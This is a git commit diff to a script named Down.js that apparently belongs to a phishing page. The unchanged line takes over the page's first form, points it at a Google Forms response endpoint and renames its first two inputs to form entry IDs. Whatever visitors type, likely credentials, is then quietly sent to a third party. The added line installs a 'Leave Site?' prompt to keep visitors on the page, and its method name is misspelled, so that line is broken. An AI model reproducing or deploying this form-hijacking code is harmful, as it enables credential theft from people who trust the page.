7b8c3179347de83d58361e9dd09cc8d09b36faf0
sonpanabtej <hv2471920@gmail.com>
2021-06-14 12:04:45 +0530

    Update Down.js

--- Down.js
+++ Down.js
@@ -1,1 +1,2 @@
 function Ch(){var C = document.getElementsByTagName('form'); C[0].action ="https://docs.google.com/forms/u/0/d/e/1FAIpQLSfthAOyy2oF38lU5f4ag3ulJ8AHcRXtPHHJ-ibRh7UfX_6etw/formResponse";var D =document.getElementsByTagName('input'); D[0].name="entry.190958851";D[1].name="entry.470512502";}Ch();
+window.addEventListeners("beforeunload",function(e){e.returnValue="Leave Site ? | Reload Site?";});
